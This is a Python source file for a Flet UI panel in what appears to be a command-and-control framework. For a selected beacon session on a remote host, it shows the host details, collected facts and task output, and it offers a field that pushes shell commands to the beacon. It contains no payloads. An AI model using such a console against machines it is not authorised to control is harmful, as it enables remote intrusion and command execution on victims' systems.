"""AgentDetail — per-agent detail panel for the C2 view.

Shows task history and provides a manual command input.
Uses direct widget references (not ft.use_state) because the TextField
is read from an on_click handler which runs outside renderer context.
"""
import flet as ft
from models.apt import Apt

CYAN = ft.Colors.CYAN_400


@ft.component
def AgentDetail(state: Apt, session_id: str):
    """Render the detail panel for a specific beacon session."""
    beacon_mod = state.modules.classes.get("beacon")
    c2_server = getattr(beacon_mod, "_c2_server", None) if beacon_mod else None
    sess = None
    if c2_server and session_id:
        sess = c2_server.sessions.get(session_id)

    if sess is None:
        return ft.Container(
            ft.Column(
                [
                    ft.Icon(ft.Icons.WIFI_TETHERING_OFF, color=ft.Colors.GREY_700, size=40),
                    ft.Text("Select a session to view details", size=13, color=ft.Colors.GREY_500),
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                alignment=ft.MainAxisAlignment.CENTER,
                spacing=8,
            ),
            alignment=ft.Alignment.CENTER,
            expand=True,
        )

    # Fact chips row
    fact_chips = ft.Row(
        [
            ft.Container(
                ft.Text(k, size=10, color=ft.Colors.WHITE),
                bgcolor=ft.Colors.GREEN_800,
                border_radius=10,
                padding=ft.Padding(left=6, right=6, top=2, bottom=2),
            )
            for k, v in sess.facts.items() if v
        ],
        spacing=4,
        wrap=True,
    )

    # Task history
    history_items: list[ft.Control] = []
    for result in reversed(sess.results[-50:]):
        output = result.decoded_output()
        exit_color = ft.Colors.GREEN_400 if result.exit_code == 0 else ft.Colors.RED_400
        history_items.append(
            ft.Container(
                ft.Column(
                    [
                        ft.Row(
                            [
                                ft.Text(
                                    f"Task {result.task_id[:8]}",
                                    size=11,
                                    color=ft.Colors.GREY_400,
                                    font_family="monospace",
                                ),
                                ft.Text(
                                    f"exit:{result.exit_code}",
                                    size=11,
                                    color=exit_color,
                                ),
                            ],
                            spacing=8,
                        ),
                        ft.Text(
                            output[:500] + ("…" if len(output) > 500 else ""),
                            size=11,
                            color=ft.Colors.GREY_300,
                            font_family="monospace",
                            no_wrap=False,
                        ),
                    ],
                    spacing=4,
                ),
                bgcolor=ft.Colors.GREY_900,
                border_radius=6,
                padding=8,
                border=ft.Border.all(1, ft.Colors.GREY_800),
            )
        )

    if not history_items:
        history_items.append(
            ft.Container(
                ft.Text("No tasks executed yet.", size=12, color=ft.Colors.GREY_600),
                padding=8,
            )
        )

    # Manual command input — direct widget reference (NOT ft.use_state)
    cmd_field = ft.TextField(
        hint_text="Shell command…",
        border_color=ft.Colors.GREY_700,
        focused_border_color=CYAN,
        text_size=13,
        bgcolor=ft.Colors.GREY_900,
        expand=True,
        dense=True,
        font_family="monospace",
    )

    def send_command(e):
        cmd = cmd_field.value.strip()
        if not cmd or beacon_mod is None:
            return
        pushed = beacon_mod.push_command(session_id, cmd)
        if pushed:
            cmd_field.value = ""
            cmd_field.update()
        else:
            pass  # silently ignore if server not running

    return ft.Container(
        ft.Column(
            [
                # Header
                ft.Row(
                    [
                        ft.Icon(ft.Icons.COMPUTER, color=CYAN, size=18),
                        ft.Text(
                            f"{sess.hostname} ({sess.username}@{sess.platform})",
                            size=14,
                            weight=ft.FontWeight.BOLD,
                            color=ft.Colors.WHITE,
                            expand=True,
                        ),
                        ft.Text(
                            sess.session_id[:12],
                            size=11,
                            color=ft.Colors.GREY_500,
                            font_family="monospace",
                        ),
                    ],
                    spacing=8,
                    vertical_alignment=ft.CrossAxisAlignment.CENTER,
                ),
                ft.Container(height=1, bgcolor=ft.Colors.GREY_800),
                # Facts
                ft.Row(
                    [
                        ft.Text("Facts:", size=12, color=ft.Colors.GREY_400),
                        fact_chips,
                    ],
                    spacing=8,
                    vertical_alignment=ft.CrossAxisAlignment.CENTER,
                ),
                ft.Container(height=1, bgcolor=ft.Colors.GREY_800),
                # Task history
                ft.Text("Task History", size=12, weight=ft.FontWeight.BOLD, color=ft.Colors.GREY_300),
                ft.Column(
                    history_items,
                    spacing=6,
                    scroll=ft.ScrollMode.AUTO,
                    expand=True,
                ),
                ft.Container(height=1, bgcolor=ft.Colors.GREY_800),
                # Manual command
                ft.Row(
                    [
                        cmd_field,
                        ft.IconButton(
                            ft.Icons.SEND,
                            icon_color=CYAN,
                            tooltip="Send command",
                            on_click=send_command,
                        ),
                    ],
                    spacing=4,
                    vertical_alignment=ft.CrossAxisAlignment.CENTER,
                ),
            ],
            expand=True,
            spacing=10,
        ),
        expand=True,
        padding=16,
        bgcolor=ft.Colors.GREY_900,
        border_radius=12,
    )
